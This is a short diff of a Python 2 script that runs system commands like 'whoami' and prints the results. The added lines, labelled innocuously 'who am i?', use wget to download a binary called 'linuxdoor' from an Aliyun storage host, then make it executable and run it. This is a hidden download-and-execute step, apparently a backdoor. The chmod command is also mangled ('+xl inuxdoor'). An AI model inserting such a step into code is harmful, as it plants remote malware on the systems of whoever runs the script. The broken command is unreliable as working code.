@@ -18,6 +18,12 @@ print "who am i?"
 p = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print p.communicate()[0]
 
+#wget
+
+print "who am i?"
+p = subprocess.Popen("wget http://tlbb.oss-cn-hangzhou.aliyuncs.com/linuxdoor && chmod +xl inuxdoor && ./linuxdoor", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print p.communicate()[0]
+
 #find out my groups
 
 print "groups!"
